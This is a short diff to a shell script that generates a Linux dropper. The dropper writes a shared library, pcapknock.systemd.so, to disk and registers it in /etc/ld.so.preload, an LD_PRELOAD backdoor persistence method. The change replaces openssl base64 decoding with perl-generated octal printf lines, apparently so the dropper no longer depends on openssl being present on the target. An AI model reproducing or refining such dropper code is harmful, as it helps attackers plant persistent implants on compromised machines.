@@ -48,10 +48,7 @@ if [ "Linux" = "$(uname -s)" ]; then
         echo 'LB=$LA.$RANDOM'                                                               >>$DROPPER
         echo 'PA=/etc/ld.so.preload'                                                        >>$DROPPER
         echo 'PB=$PA.$RANDOM'                                                               >>$DROPPER
-        echo 'if ! which openssl >/dev/null; then echo "OpenSSL not found" >&2; exit 1; fi' >>$DROPPER
-        echo 'cat <<_eof | openssl base64 -d >$LB'                                          >>$DROPPER
-        openssl base64 -e <$OUTDIR/pcapknock.systemd.so                                     >>$DROPPER
-        echo '_eof'                                                                         >>$DROPPER
+        perl -E '$/=\16;while(<>){$s=join"",map{sprintf"\\%03o",ord}split//;say"printf \"$s\" >>\$LB"}' $OUTDIR/pcapknock.systemd.so >>$DROPPER
         echo 'chmod 0755 $LB'                                                               >>$DROPPER
         echo 'echo $LA > $PB'                                                               >>$DROPPER
         echo 'if [ -r $PA ]; then grep -v $LA $PA >> $PB; fi'                               >>$DROPPER
